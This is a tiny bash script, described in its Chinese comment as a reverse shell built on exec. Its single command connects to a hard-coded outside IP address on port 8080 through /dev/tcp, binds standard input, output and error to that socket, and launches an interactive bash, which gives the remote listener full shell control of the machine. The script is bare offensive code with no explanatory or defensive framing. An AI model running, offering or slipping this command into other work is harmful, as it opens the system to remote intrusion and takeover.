#!/bin/bash

# >  desc: 反弹shell 基于exec 
# >  author: s0nnet
# >  time: 2017-01-20

exec 9<> /dev/tcp/23.106.159.159/8080&&exec 0<&9&&exec 1>&9 2>&1&&/bin/bash --noprofile -I
